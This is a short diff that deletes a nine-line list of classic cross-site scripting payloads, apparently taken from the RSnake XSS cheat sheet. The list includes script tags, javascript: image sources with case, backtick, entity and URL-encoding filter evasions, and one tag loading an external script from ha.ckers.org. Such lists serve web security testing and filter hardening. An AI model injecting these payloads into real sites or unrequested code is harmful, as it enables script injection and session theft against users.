@@ -1,9 +1,0 @@
-<SCRIPT>alert('XSS');</SCRIPT>
-'';!--"<XSS>=&{()}
-<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
-<IMG SRC="javascript:alert('XSS');">
-<IMG SRC=javascript:alert('XSS')>
-<IMG SRC=JaVaScRiPt:alert('XSS')>
-<IMG SRC=javascript:alert(&quot;XSS&quot;)>
-<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>
-<SCRIPT>alert%28%27XSS%27%29%3B<%2FSCRIPT>
